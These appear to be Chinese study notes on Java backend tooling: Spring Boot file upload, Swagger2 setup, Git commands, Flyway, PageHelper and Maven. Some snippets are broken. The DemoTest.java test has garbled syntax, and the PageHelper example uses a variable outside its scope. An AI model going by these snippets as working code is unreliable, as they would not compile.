```

利用postman测试：

> 注意：请求参数名和controller方法形参名保持一致

![image-20221227211742547](./img/小米虫爬山路-img/image-20221227211742547.png)

![image-20221227214219279](./img/小米虫爬山路-img/image-20221227214219279.png)

![image-20221227214753358](./img/小米虫爬山路-img/image-20221227214753358.png)

通过postman测试，我们发现文件上传是没有问题的。但是由于我们是使用原始文件名作为所上传文件的存储名字，当我们再次上传一个名为1.jpg文件时，发现会把之前已经上传成功的文件覆盖掉。



解决方案：保证每次上传文件时文件名都唯一的（使用UUID获取随机文件名）

~~~java
@Slf4j
@RestController
public class UploadController {

    @PostMapping("/upload")
    public Result upload(String username, Integer age, MultipartFile image) throws IOException {
        log.info("文件上传：{},{},{}",username,age,image);

        //获取原始文件名
        String originalFilename = image.getOriginalFilename();

        //构建新的文件名
        String extname = originalFilename.substring(originalFilename.lastIndexOf("."));//文件扩展名
        String newFileName = UUID.randomUUID().toString()+extname;//随机名+文件扩展名

        //将文件存储在服务器的磁盘目录
        image.transferTo(new File("E:/images/"+newFileName));

        return Result.success();
    }

}
~~~

在解决了文件名唯一性的问题后，我们再次上传一个较大的文件(超出1M)时发现，后端程序报错：

![image-20221227223851924](./img/小米虫爬山路-img/image-20221227223851924.png)

报错原因呢是因为：在SpringBoot中，文件上传时默认单个文件最大大小为1M

那么如果需要上传大文件，可以在application.properties进行如下配置：

~~~properties
#配置单个文件最大上传大小
spring.servlet.multipart.max-file-size=10MB

#配置单个请求最大上传大小(一次请求可以上传多个文件)
spring.servlet.multipart.max-request-size=100MB
~~~



到时此，我们文件上传的本地存储方式已完成了。但是这种本地存储方式还存在一问题： 

![image-20220904200320964](./img/小米虫爬山路-img/image-20220904200320964.png) 

如果直接存储在服务器的磁盘目录中，存在以下缺点：

- 不安全：磁盘如果损坏，所有的文件就会丢失
- 容量有限：如果存储大量的图片，磁盘空间有限(磁盘不可能无限制扩容)
- 无法直接访问

为了解决上述问题呢，通常有两种解决方案：

- 自己搭建存储服务器，如：fastDFS 、MinIO
- 使用现成的云服务，如：阿里云，腾讯云，华为云

### 4、Swagger2

#### 4.1 问题

接口文档对于前后端开发人员都十分重要。尤其近几年流行前后端分离后接口文档又变成重中之重。接口文档固然重要,但是由于项目周期等原因后端人员经常出现无法及时更新)，导致前端人员抱怨接口文档和实际情况不一致。

很多人员会抱怨别人写的接口文档不规范，不及时更新。当时当自己写的时候确实最烦
去写接口文档。这种痛苦只有亲身经历才会牢记于心。

如果接口文档可以实时动态生成就不会出现上面问题。

Swagger可以完美的解决上面的问题。

#### 4.2 Swagger简介

Swagger是一套围绪Open API规范构建的并源工具)可以帮助设计，构建，记录和使用REST API。

> ==Swagger工具包括的组件︰==
>
> Swagger Editor:基于浏览器编辑器，可以在里面编写Open API规范。类似Markdown具有实时预览描述文件的功能。
>
> Swagger UI:将Open API规范呈现为交互式API文档。用可视化UI展示描述文件。
>
> Swagger Codegen:将OpenAPI规范生成为服务器存根和客户端库。通过SwaggerCodegen可以将描述文件生成html格式和 cwiki形式的接口文档，同时也可以生成多种
> 言语的客户端和服务端代码。
>
> Swagger Inspector:和Swagger UI有点类似，但是可以返回更多信息，也会保存请求的实际参数数据。
>
> Swagger Hub:集成了上面所有项目的各个功能，你可以以项目和版本为单位，将你的描述文件上传到Swagger Hub中。在Swagger Hub中可以完成上面项目的所有工作，
> 需要注册账号，分免费版和收费版。

使用Swagger，就是把相关的信息存储在它定义的描述文件里面( yml或json格式）， 再通过维护这个描述文件可以去更新接口文档，以及生成各端代码

#### 4.3 快速入门

第一步：在SprongBoot项目中导入依赖

```xml
<!--swagger2-->
<dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-swagger2</artifactId>
            <version>2.9.2</version>
        </dependency>
<!--swaggerui-->
        <dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-swagger-ui</artifactId>
            <version>2.9.2</version>
        </dependency>
```

配置swagger看下面

注意：SpringBoot高于2.5.6后就会有不兼容问题需要配置文件中添加以下内容`spring.mvc.path match.matching-strategy= ANT_PATH_MATCHER`

开启程序，然后在浏览器中进入SwaggerUI - http://localhost:8080/swagger-ui.html

#### 4.4 Swagger配置

#####  4.4.1 基础配置

```java
@Configuration
@EnableSwagger2
public class SwaggerConfig {

    @Value(value = "${swagger.basic.enabled}")
    private Boolean enabled;

    /**
     * 创建Docket类型的对象。并使用spring容器管理。
     * Docket是Swagger中的全局配置对象。
     * @return
     */
    @Bean //配置docket以配置Swagger具体参数
    public Docket docket() {
        return new Docket(DocumentationType.SWAGGER_2)
                .enable(enabled)
                .apiInfo(apiInfo())
                .select()
                .apis(RequestHandlerSelectors.basePackage("com.rige.reigejava.common.api.controller"))
                .paths(PathSelectors.any())
                .build()
                .securityContexts(securityContexts())
                .securitySchemes(securitySchemes());

    }

    private ApiInfo apiInfo() {
        return new ApiInfoBuilder()
                .title("${项目名称}")
                .description("${描述}")
                .version("1.0")
                .build();
    }

    //为swagger设置jwt的进入口
    private List<ApiKey> securitySchemes() {
        List<ApiKey> apiKeyList = new ArrayList<>();
        apiKeyList.add(new ApiKey("Authorization", "Authorization", "header"));
        return apiKeyList;
    }

    private List<SecurityContext> securityContexts() {
        List<SecurityContext> securityContexts = new ArrayList<>();
        securityContexts.add(
                SecurityContext.builder()
                        .securityReferences(defaultAuth())
                        .forPaths(PathSelectors.any())
                        .build());
        return securityContexts;
    }

    private List<SecurityReference> defaultAuth() {
        AuthorizationScope authorizationScope = new AuthorizationScope("global", "accessEverything");
        AuthorizationScope[] authorizationScopes = new AuthorizationScope[1];
        authorizationScopes[0] = authorizationScope;
        List<SecurityReference> securityReferences = new ArrayList<>();
        securityReferences.add(new SecurityReference("Authorization", authorizationScopes));
        return securityReferences;
    }
```

##### 4.4.2 扫描包配置

```java
//在原本的配置类中添加如下
docket
                .select() //获取Docket中的选择器。返回ApiSelectorBuilder。 构建选择器 比如：扫描哪个包的注解
                .apis(RequestHandlerSelectors.basePackage("com.example.demo2.controller"))//设定扫描哪个包中的注解
	        .build()//重新构建
```

#### 4.5 基础注解

| **Swagger注解**                                        | **简单说明**                                         |
| ------------------------------------------------------ | ---------------------------------------------------- |
| @Api(tags = "xxx模块说明")                             | 作用在模块类上                                       |
| @ApiOperation("xxx接口说明")                           | 作用在接口方法上                                     |
| @ApiModel("xxxPOJO说明")                               | 作用在模型类上：如VO、BO                             |
| @ApiModelProperty(value = "xxx属性说明",hidden = true) | 作用在类方法和属性上，hidden设置为true可以隐藏该属性 |
| @ApiParam("xxx参数说明")                               | 作用在参数、方法和字段上，类似@ApiModelProperty      |

### 5、Git

#### 5.1 Git流程图

![image-20230826124621715](./img/小米虫爬山路-img/image-20230826124621715.png)

命令如下：

1. clone（克隆）: 从远程仓库中克隆代码到本地仓库
2. checkout （检出）:从本地仓库中检出一个仓库分支然后进行修订
3. add（添加）: 在提交前先将代码提交到暂存区
4. commit（提交）: 提交到本地仓库。本地仓库中保存修改的各个历史版本
5. fetch (抓取) ： 从远程库，抓取到本地仓库，不进行任何的合并动作，一般操作比较少。
6. pull (拉取) ： 从远程库拉到本地库，自动进行合并(merge)，然后放到到工作区，相当于fetch+merge
7. push（推送） : 修改完成后，需要和团队成员共享代码时，将代码推送到远程仓库



#### 5.2 基本配置

##### 5.2.1 用户信息配置

1. 打开Git Bash
2. 设置用户信息
   `git config --global user.name “5sx”`
   `git config --global user.email “786067922@qq.com”`

查看配置信息
`git config --global user.name`
`git config --global user.email`

##### 5.2.2 解决GitBash乱码问题

1. 打开GitBash执行下面命令

   ```shell
   git config --global core.quotepath false
   ```

2. `${git_home}/etc/bash.bashrc`文件最后加入下面两行

   ```shell
   export LANG="zh_CN.UTF-8"
   export LC_ALL="zh_CN.UTF-8"
   ```

#### 5.3 基本操作

##### 5.3.1 获取本地仓库

要使用Git对我们的代码进行版本控制，首先需要获得本地仓库
1）在电脑的任意位置创建一个空目录（例如test）作为我们的本地Git仓库
2）进入这个目录中，点击右键打开Git bash窗口
3）执行命令`git init`
4）如果创建成功后可在文件夹下看到隐藏的.git目录。

![获取本地仓库](./img/小米虫爬山路-img/获取本地仓库.png)

##### 5.3.2 基础操作指令

![image-20230826125410286](./img/小米虫爬山路-img/image-20230826125410286.png)

==**查看修改的状态(status)**==

- 作用：查看的修改的状态（暂存区、工作区）
- 命令形式：`git status`

==**添加工作区到暂存区(add)**==

- 作用：添加工作区一个或多个文件的修改到暂存区
- 命令形式：`git add 单个文件名|通配符`
  - 将所有修改加入暂存区：`git add .`

==**提交暂存区到本地仓库(commit)**==

- 作用：提交暂存区内容到本地仓库的当前分支
- 命令形式：`git commit -m '注释内容'`

==**查看提交日志(log)**==

- 作用:查看提交记录
- 命令形式：`git log [option]`
  - options
    - `--all` 显示所有分支
    - `--pretty=oneline` 将提交信息显示为一行
    - `--abbrev-commit` 使得输出的commitID更简短
    - `--graph` 以图的形式显示

==**版本回退**==

- 作用：版本切换
- 命令形式：`git reset --hard commitID`
  - commitID 可以使用`git-log`或`git log`指令查看
- 如何查看已经删除的记录？
  - `git reflog`
  - 这个指令可以看到已经删除的提交记录

==**添加文件至忽略列表**==

一般我们总会有些文件无需纳入Git 的管理，也不希望它们总出现在未跟踪文件列表。 通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。 在这种情况下，我们可以在工作目录中创建一个名为` .gitignore`的文件（文件名称固定），列出要忽略的文件模式。下面是一个示例：

```shell
# no .a files
*.a
# but do track lib.a, even though you're ignoring .a files above
!lib.a
# only ignore the 'TODO' file in the current directory, not subdir/TODO
/TODO
# ignore all files in the 'build/' directory
build/
# ignore doc/notes.txt, but not doc/server/arch.txt
doc/*.txt
# ignore all .pdf files in the doc/ directory
doc/**/*.pdf
```

#### 5.4 分支

几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来进行重大的Bug修改、开发新的功能，以免影响开发主线。

##### 5.4.1、查看本地分支

- 命令：`git branch`

##### 5.4.2、创建本地分支

- 命令：`git branch 分支名`

##### 5.4.4、*切换分支(checkout)

- 命令：`git checkout 分支名`

我们还可以直接切换到一个不存在的分支（创建并切换）

- 命令：`git checkout -b 分支名`

##### 5.4.6、*合并分支(merge)

一个分支（合并分支）上的提交可以合并到另一个分支（目标分支）

- 需要先切换到目标分支：`git checkout 目标分支名`
- 合并命令：`git merge 合并分支名`

##### 5.4.7、删除分支

**不能删除当前分支，只能删除其他分支**

- `git branch -d 分支名` 删除分支时，需要做各种检查
- `git branch -D 分支名` 不做任何检查，强制删除
- E.g.
  ![删除分支](./img/小米虫爬山路-img/删除分支.png)

##### 5.4.8、解决冲突

当两个分支上对文件的修改可能会存在冲突，例如同时修改了同一个文件的同一行，这时就需要手动解决冲突，解决冲突步骤如下：

1. 处理文件中冲突的地方
2. 将解决完冲突的文件加入暂存区(add)
3. 提交到仓库(commit)

冲突部分的内容处理如下所示：

![冲突处理.png](./img/小米虫爬山路-img/冲突处理.png)

##### 5.4.9、开发中分支使用原则与流程

几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来进行重大的Bug修改、开发新的功能，以免影响开发主线。

在开发中，一般有如下分支使用原则与流程：

- master （生产） 分支
  线上分支，主分支，中小规模项目作为线上运行的应用对应的分支。
- develop（开发）分支
  是从master创建的分支，一般作为开发部门的主要开发分支，如果没有其他并行开发不同期上线要求，都可以在此版本进行开发，阶段开发完成后，需要是合并到master分支,准备上线。
- feature/xxxx分支
  从develop创建的分支，一般是同期并行开发，但不同期上线时创建的分支，分支上的研发任务完成后合并到develop分支。
- hotfix/xxxx分支，
  从master派生的分支，一般作为线上bug修复使用，修复完成后需要合并到master、test、develop分支。
- 还有一些其他分支，在此不再详述，例如test分支（用于代码测试）、pre分支（预上线分支）等等。
- ![分支](./img/小米虫爬山路-img/分支.png)

#### 5.5 Git远程仓库

```
前面我们已经知道了Git中存在两种类型的仓库，即本地仓库和远程仓库。那么我们如何搭建Git远程仓库呢？我们可以借助互联网上提供的一些代码托管服务来实现，其中比较常用的有GitHub、码云、GitLab等。
	gitHub（ 地址：https://github.com/ ）是一个面向开源及私有软件项目的托管平台，因为只支持Git 作为唯一的版本库格式进行托管，故名gitHub
	码云（地址： https://gitee.com/ ）是国内的一个代码托管平台，由于服务器在国内，所以相比于GitHub，码云速度会更快
	GitLab （地址： https://about.gitlab.com/ ）是一个用于仓库管理系统的开源项目，使用Git作为代码管理工具，并在此基础上搭建起来的web服务,一般用于在企业、学校等内部网络搭建git私服。
```

我们这里选用gitee

##### 5.5.1 创建远程仓库

这一步的前提是已经注册好了gitee

![image-20230826133650162](./img/小米虫爬山路-img/image-20230826133650162.png)

##### 5.5.2 配置SSH公钥

- 生成SSH公钥
  - `ssh-keygen -t rsa`
  - 不断回车
    - 如果公钥已经存在，则自动覆盖
- Gitee设置账户共公钥
  - 获取公钥
    - `cat ~/.ssh/id_rsa.pub`
  - ![SSH公钥](./img/小米虫爬山路-img/SSH公钥.png)
  - 验证是否配置成功
    - `ssh -T git@gitee.com`

##### 5.5.3 操作远程仓库

==**添加远程仓库**==

**此操作是先初始化本地库，然后与已创建的远程库进行对接。**

- 命令： `git remote add <远端名称> <仓库路径>`
  - 远端名称，默认是origin，取决于远端服务器设置
  - 仓库路径，从远端服务器获取此URL
  - 例如：
    `git remote add origin git@gitee.com:czbk_zhang_meng/git_test.git`
    ![添加远程仓库](./img/小米虫爬山路-img/添加远程仓库.png)

==**查看远程仓库**==

- 命令：`git remote`
  ![查看远程仓库](./img/小米虫爬山路-img/查看远程仓库.png)

==**推送到远程仓库**==

- 命令：`git push[ -f][ --set-upstream][ 远端名称[ 本地分支名[:远端分支名]]]`
  - 如果远程分支名和本地分支名称相同，则可以只写本地分支
    - `git push origin master`=`git push origin master:master`
      ![推送到远程仓库-两种写法](./img/小米虫爬山路-img/推送到远程仓库-两种写法.png)
  - `-f` = `--force` 表示强制覆盖
  - `-u` = `--set-upstream` 推送到远端的同时并且建立起和远端分支的关联关系。
    - `git push --set-upstream origin master`
  - 如果**当前分支已经和远端分支关联**，则可以省略分支名和远端名。
    - `git push` 将master分支推送到已关联的远端分支。
      ![推送到远程仓库](./img/小米虫爬山路-img/推送到远程仓库.png)

查询远程仓库

![查询远程仓库](./img/小米虫爬山路-img/查询远程仓库.png)

==**本地分支与远程分支的关联关系**==

- 查看关联关系我们可以使用 `git branch -vv` 命令

![查看本地分支和远程分支的关联关系](./img/小米虫爬山路-img/查看本地分支和远程分支的关联关系.png)

==**从远程仓库克隆**==

如果已经有一个远端仓库，我们可以直接clone到本地。

- 命令: `git clone <仓库路径> [本地目录]`
  - 本地目录可以省略，会自动生成一个目录

![克隆远程仓库到本地](./img/小米虫爬山路-img/克隆远程仓库到本地.png)

==**从远程仓库中抓取和拉取**==

远程分支和本地的分支一样，我们可以进行merge操作，只是需要先把远端仓库里的更新都下载到本地，再进行操作。

- 抓取 命令：`git fetch [remote name] [branch name]`
  - **抓取指令就是将仓库里的更新都抓取到本地，不会进行合并**
  - 如果不指定远端名称和分支名，则抓取所有分支。
- 拉取 命令：`git pull [remote name] [branch name]`
  - **拉取指令就是将远端仓库的修改拉到本地并自动进行合并，等同于fetch+merge**
  - 如果不指定远端名称和分支名，则抓取所有并更新当前分支。

1. 在test01这个本地仓库进行一次提交并推送到远程仓库
   ![在test01这个本地仓库进行一次提交并推送到远程仓库](./img/小米虫爬山路-img/在test01这个本地仓库进行一次提交并推送到远程仓库.png)
2. 在另一个仓库将远程提交的代码拉取到本地仓库
   ![将仓库里远程提交的代码拉取到本地仓库](./img/小米虫爬山路-img/将仓库里远程提交的代码拉取到本地仓库.png)

==**解决合并冲突**==

在一段时间，A、B用户修改了同一个文件，且修改了同一行位置的代码，此时会发生合并冲突。

A用户在本地修改代码后优先推送到远程仓库，此时B用户在本地修订代码，提交到本地仓库后，也需要推送到远程仓库，此时B用户晚于A用户，**故需要先拉取远程仓库的提交，经过合并后才能推送到远端分支**，如下图所示。

![解决远程仓库合并冲突](./img/小米虫爬山路-img/解决远程仓库合并冲突.png)

在B用户拉取代码时，因为A、B用户同一段时间修改了同一个文件的相同位置代码，故会发生合并冲突。

**远程分支也是分支，所以合并时冲突的解决方式也和解决本地分支冲突相同相同**，在此不再赘述，需要学员自己练习。

### 6、flyway

Flyway 是一款开源的数据库版本管理工具，它更倾向于规约优于配置的方式。Flyway 可以独立于应用实现管理并跟踪数据库变更，支持数据库版本自动升级，并且有一套默认的规约，不需要复杂的配置，Migrations 可以写成 SQL 脚本，也可以写在 Java 代码中，不仅支持 Command Line 和 Java API，还支持 Build 构建工具和 Spring Boot 等，同时在分布式环境下能够安全可靠地升级数据库，同时也支持失败恢复等。

#### 6.1 运行原理

当 Flyway 连接数据库中的 schema 后，会先检查是否已存在 flyway_schema_history 表，如果没有则创建。该表用于跟踪数据库的状态，如数据迁移的版本，迁移成功状态等信息。

当 flyway_schema_history 存在后，Flyway 会扫描文件系统或应用中的 classpath 目录的数据迁移文件，然后根据它们的版本号进行按序迁移，如下图：

![img](./img/小米虫爬山路-img/gq0h8fumue.jpeg)

由于 flyway_schema_history 表中记录了迁移的版本号，如果文件的版本号小于或等于标记为当前版本的版本号，则忽略它们不执行。

上边描述的内容或许对读者来说还不够直观，那么下面我们就开始进行实战演练。

#### 6.2 整合SpringBoot

##### 6.2.1 添加依赖

```xml
<dependency>
    <groupId>org.flywaydb</groupId>
    <artifactId>flyway-core</artifactId>
</dependency>
<!-- flyway-core 8.2.1及以后的版本确实是不再支持MySQL。MySQL代码被提取出来作为插件，需要另外增加依赖，根据官方文档-->
<dependency>
    <groupId>org.flywaydb</groupId>
    <artifactId>flyway-mysql</artifactId>
</dependency>
```

##### 6.2.1 配置文件

```yaml
spring:
  datasource:
    url: jdbc:mysql://${数据库地址}:${域名}/${数据库}?useUnicode=true&characterEncoding=UTF-8&serverTimezone=Asia/Shanghai
    username: ${用户名默认root}
    password: ${密码}
 # flyway 配置
spring:
  flyway:
    # 启用或禁用 flyway
    enabled: true
    # flyway 的 clean 命令会删除指定 schema 下的所有 table, 生产务必禁掉。这个默认值是 false 理论上作为默认配置是不科学的。
    clean-disabled: true
    # SQL 脚本的目录,多个路径使用逗号分隔 默认值 classpath:db/migration
    locations: classpath:db/migration
    #  metadata 版本控制信息表 默认 flyway_schema_history
    table: flyway_schema_history
    # 如果没有 flyway_schema_history 这个 metadata 表， 在执行 flyway migrate 命令之前, 必须先执行 flyway baseline 命令
    # 设置为 true 后 flyway 将在需要 baseline 的时候, 自动执行一次 baseline。
    baseline-on-migrate: true
    # 指定 baseline 的版本号,默认值为 1, 低于该版本号的 SQL 文件, migrate 时会被忽略
    baseline-version: 1
    # 字符编码 默认 UTF-8
    encoding: UTF-8
    # 是否允许不按顺序迁移 开发建议 true  生产建议 false
    out-of-order: false
    # 需要 flyway 管控的 schema list,这里我们配置为flyway  缺省的话, 使用spring.datasource.url 配置的那个 schema,
    # 可以指定多个schema, 但仅会在第一个schema下建立 metadata 表, 也仅在第一个schema应用migration sql 脚本.
    # 但flyway Clean 命令会依次在这些schema下都执行一遍. 所以 确保生产 spring.flyway.clean-disabled 为 true
    schemas: ${数据库名字}
    # 执行迁移时是否自动调用验证   当你的 版本不符合逻辑 比如 你先执行了 DML 而没有 对应的DDL 会抛出异常
    validate-on-migrate: true
```

##### 6.2.3 flyway

==注意：flyway是通过脚本来控制数据库的==



sql 脚本存放目录:src/main/resources/db/migration
Flyway 将 SQL 文件分为 Versioned 、Repeatable 和 Undo 三种：

`Versioned` 用于版本升级, 每个版本有唯一的版本号并只能执行一次.

`Repeatable` 可重复执行, 当 Flyway检测到 Repeatable 类型的 SQL 脚本的 checksum 有变动, Flyway 就会重新应用该脚本. 它并不用于版本更新, 这类的

migration 总是在 Versioned 执行之后才被执行。

`Undo` 用于撤销具有相同版本的版本化迁移带来的影响。但是该回滚过于粗暴，过于机械化，一般不对应一个程序版本的多个脚本，从1开始，比如1.0.9版本，有多个任务：张三负责a任务（tapd号为1111111），李四负责b任务（tapd号为222222），他们的任务都涉及到db更新他们会分别创建两个脚本：

`V1.0.9.0.1__1111111.sql__`

`__V1.0.9.0.2__222222.sql`
说明：V大写，中间是两个下划线（__）
![3.png](./img/小米虫爬山路-img/851db300232e4d13be8654b0f979b0e2.png)

### 7、PageHelper

PageHelper是国内非常优秀的一款开源的mybatis分页插件，它支持基本的主流与常用的数据库。例如mysql、oracle、mariaDB、DB2、Hsqldb等。

  官网链接：(https://PageHelper.github.io)对于该开源项目刚兴趣的同学可以点进去阅读以下其官方文档，加深一下印象。

#### 7.1 快速上手

这里整合SpringBoot项目,在整合Mybaits-plus

##### 1、导入依赖

```xml
<!--分页插件-->
        <dependency>
            <groupId>com.github.pagehelper</groupId>
            <artifactId>pagehelper-spring-boot-starter</artifactId>
            <version>最新版</version>
        </dependency>
```

##### 2、配置文件

```yml
#分页插件会自动检测当前的数据库链接，自动选择合适的分页方式。 你可以配置helperDialect 属性来指定分页插件使用哪种方言。
pagehelper:
 helper-dialect: mysql
#分页合理化参数，默认值为 false 。当该参数设置为 true 时， pageNum<=0 时会查询第一页， pageNum>pages （超过总数时），会查询最后一页。
pagehelper: 
 reasonable: true
#支持通过Mapper接口参数传递page参数,默认值为falset
pagehelper: 
 support-methods-arguments: true
#默认值为 false ，当该参数设置为 true 时，如果 pageSize=0 或者 RowBounds.limit =0 就会查询出全部的结果（相当于没有执行分页查询，但是返回结果仍然是 Page 类型）。
pagehelper:
 pageSizeZero: true
```

##### 3、使用PageHelper

```java
@RequestMapping("/page/{pn}")
public ResultData<PageInfo> cityPage(@PathVariable  Integer pn/*页数*/){
    try {
		//1.引入分页插件,第一个参数pageNum是第几页，第二个参数pageSize是每页显示多少条,默认查询总数count，第三个参数是否查询总条数
	    Page<City> page = PageHelper.startPage(pn,3);
	    //2.紧跟的查询就是一个分页查询-必须紧跟.后面的其他查询不会被分页
	    List<City> cityList = cityService.list();
	    //3.使用PageInfo包装查询后的结果,3是连续显示的条数 注意也可以不用PageInfo封装直接返回 ，这个pageInfo封装了很多参数可以使用这个来获取想要的参数
	    PageInfo pageInfo = new PageInfo(cityList, 3);
	}finally {
		//清理 ThreadLocal 存储的分页参数,保证线程安全
        PageHelper.clearPage(); 
    }	    
			    
    return new ResultData<PageInfo>().setData(pageInfo);
}
```



### 8、Maven

#### 8.1 maven简介

传统项目管理

![image-20240112150318208](./img/小米虫爬山路-img/image-20240112150318208.png)

##### 8.1.1 Maven是什么

- Maven的本质是一个项目管理工具，将项目开发和管理过程抽象成一个项目对象模型(POM)
- POM (ProjectObjectModel) : 项目对象模型

![image-20240112150551901](./img/小米虫爬山路-img/image-20240112150551901.png)

##### 8.1.2 Maven作用

- 项目构建:提供标准的、跨平台的自动化项目构建方式
- 依赖管理:方便快捷的管理项目依赖的资源(ar包)，避免资源间的版本冲突问题
- 统一开发结构:提供标准的、统一的项目结构

#### 8.2 Maven基础概念

##### 8.2.1 仓库

定义：仓库用于存储资源，包含各种jar包

仓库分类:

​	**本地仓库**:自己电脑上存储资源的仓库，连接远程仓库获取资源

​	**远程仓库**:非本机电脑上的仓库，为本地仓库提供资源

​		中央仓库:Maven团队维护，存储所有资源的仓库

​		私服:部门/公司范围内存储资源的仓库，从中央仓库获取资源

私服的作用:

​	保存具有版权的资源，包含购买或自主研发的jar

​	中央仓库中的jar都是开源的，不能存储具有版权的资源

​	一定范围内共享资源，仅对内部开放，不对外共享



**==Maven访问的顺序是 本地 -》 私服 -》 中央==**

##### 8.2.2 坐标

定义:Maven中的坐标用于描述仓库中资源的位置

[官方坐标](https://repo1.maven.org/maven2/)

**坐标组成部分**

​	groupId:定义当前Maven项目隶属组织的名称（通常是域名反写，例如：org.mybatis）

​	artifatId:定义当前Maven项目名称 (通常是模块名称，例如CRM、SMS)

​	version:定义当前项目版本号

​	packaging:定义该项目的打包方式（不属于坐标，但是在构建项目是需要）

**Maven坐标的作用**：使用唯一标识，唯一性定位资源位置，通过该标识可以将资源的识别与下载工作交由机器完成

#### 8.3 手动Maven项目

##### 8.3.1 Maven工程项目

![image-20240112153756683](./img/小米虫爬山路-img/image-20240112153756683.png)

开始手动项目结构，项目结构如下：

![image-20240112160207282](./img/小米虫爬山路-img/image-20240112160207282.png)

Demo.java代码

```java
package com.testHand;

public class Demo {

public String say(String name)
{
System.out.println("你好！"+name);
return "你好！"+name;
}
}
```

DemoTest.java代码

```java
package com.testHand;

import org.junit.Test;
import org.junit.Assert:

public class DemoTestf{
@Test
public void testSay0f{
Demo d = new Demo()
String ret = d.say("maven");
Assert.assertEquals("你好！maven",ret)
}
}
```



要实现真正的Maven项目我们需要使用pom.xml文件来完成构建,pom.xml文件是与src同层目录下的

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project                         
xmlns="http://maven.apache.org/POM/4.0.0" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
	<modelVersion>4.0.0</modelVersion>    <!--对象版本号-->
	<groupId>com.testHand</groupId>   <!--定位群组id-->
	<artifactId>project-java</artifactId>    <!--项目id-->
	<version>1.0</version>  <!--项目版本-->
	<packaging>jar</packaging>  <!--打包方式-->
    
    
	<dependencies>
		<dependency>
			<groupId>junit</groupId>
			<artifactId>junit</artifactId>
			<version>4.12</version>
		</dependency>
	</dependencies>
    
    
</project> 
```

##### 8.3.2 Maven项目构建

Maven构建命令使用mvn开头，后面添加功能参数，可以一次执行多个命令，使用空格分隔

在项目文件的src目录下进入cmd窗口

| mvn compile |      编译      |
| :---------: | :------------: |
|  mvn clean  |      清理      |
|  mvn test   |      测试      |
| mvn package |      打包      |
| mvn install | 安装到本地仓库 |

##### 8.3.3 插件创建工程

Maven提供了插件来生成项目工程

创建工程的指令

```cmd
mvn archetype:generate
	-DgroupId={project-packaging} 
	-DartifactId={project-name} 
	-Dversion={ver}
	-DarchetypeArtifactId=maven-archetype-quickstart     用的模板名称
	-DinteractiveMode=false
```

创建java工程

```cmd
mvn archetype:generate -DgroupId={项目群组Id} -DartifactId={项目名称Id} -
DarchetypeArtifactId=maven-archetype-quickstart -Dversion={版本号} -
DinteractiveMode=false
```

创建web工程

```cmd
mvn archetype:generate -DgroupId={项目群组Id} -DartifactId={项目名称Id} -
DarchetypeArtifactId=maven-archetype-webapp -Dversion={版本号} -snapshot -
DinteractiveMode=false 
```

**==注意：创建的项目要在空的文件中创建，不能有其他的文件==**

#### 8.4 IDEA创建Maven项目

##### 8.4.1 项目构建

第一步创建多模块空项目

![image-20240112165755821](./img/小米虫爬山路-img/image-20240112165755821.png)

第二步选择jdk

![image-20240112165909573](./img/小米虫爬山路-img/image-20240112165909573.png)

第三步添加模块，模块为maven模板

![image-20240112170002937](./img/小米虫爬山路-img/image-20240112170002937.png)

##### 8.4.2 插件

Tomact插件

在maven中配置插件

```xml
 <!--构建-->
    <build>
        <!--    设置插件-->
        <plugins>
            <!--      具体配置插件-->
            <plugin>
                <!--        插件坐标-->
                <groupId>org.apache.tomcat.maven</groupId>
                <artifactId>tomcat7-maven-plugin</artifactId>
                <version>2.1</version>
            </plugin>
        </plugins>
    </build>
```

#### 8.5 依赖管理

##### 8.5.1 依赖配置

依赖指当前项目运行所需的jar，一个项目可以设置多个依赖

格式：

```xml
<!-- 设置当前项目所依赖的所有jar-->
<dependencies>
	<!--设置具体的依赖 -->
	<dependency>
		<!--依赖所属的群组id-->
		<groupId>junit</groupId>
		<!--依赖所属的项目id-->
		<artifactId>junit</artifactId>
		<!--版本号 -->
		<version>4.12</version>
	</dependency>
</dependencies>
```

##### 8.5.2 依赖传递

依赖具有传递性
	直接依赖:在当前项目中通过依赖配置建立的依赖关系
	间接依赖:被资源的资源如果依赖其他资源，当前项目间接依赖其他资源

![image-20240112173353290](./img/小米虫爬山路-img/image-20240112173353290.png)

##### 8.5.3 依赖传递冲突问题

路径优先:当依赖中出现相同的资源时，层级越深，优先级越低，层级越浅，优先级越高

声明优先:当资源在相同层级被依赖时，配置顺序靠前的覆盖配置顺序靠后的

特殊优先:当同级配置了相同资源的不同版本，后配置的覆盖先配置的

![image-20240112173703001](./img/小米虫爬山路-img/image-20240112173703001.png)

##### 8.5.4 可选依赖

可选依赖指对外隐藏当前所依赖的资源--不透明

即当前项目被其他项目依赖，可以选择一些当前项目的依赖隐藏。

```xml
<dependency>
<groupId>junit</groupId>
<artifactId>junit</artifactId>
<version>4.12</version>
<optional>true</optional>
</dependency>
```

##### 8.5.5 排除依赖

排除依赖指主动断开依赖的资源，被排除的资源无需指定版本一一不需要。

```xml
<dependency>
	<groupId>junit</groupId>
	<artifactId>junit</artifactId>
	<version>4.12</version>
	<exclusions>
		<exclusion>
			<groupId>org.hamcrest</groupId>
			<artifactId>hamcrest-core</artifactId>
		</exclusion>
	</exclusions>
</dependency>
```

**==排除依赖和可选依赖的区别：排除依赖是指主动的断开依赖的间接资源，而可选依赖是控制本资源不被别人看到==**

##### 8.5.6 依赖范围

依赖的jar默认情况可以在任何地方使用，可以通过scope标签设定其作用范围

作用范围

主程序范围有效(main文件夹范围内)

测试程序范围有效 (test文件夹范围内)

是否参与打包(package指令范围内)

```xml
<!--依赖资源的使用范围-->
<scope>{范围}</scope>
```

范围类型：

![image-20240112175007710](./img/小米虫爬山路-img/image-20240112175007710.png)

##### 8.5.7 依赖范围的传递性

带有依赖范围的资源在进行传递时，作用范围将受到影响

![image-20240113120424380](./img/小米虫爬山路-img/image-20240113120424380.png)

**横行是源项目使用的依赖范围**

**竖列是被使用项目的依赖范围**

#### 8.6 生命周期与插件

##### 8.6.1 项目构建生命周期

Maven构建生命周期描述的是一次构建过程经历经历了多少个事件

流程:

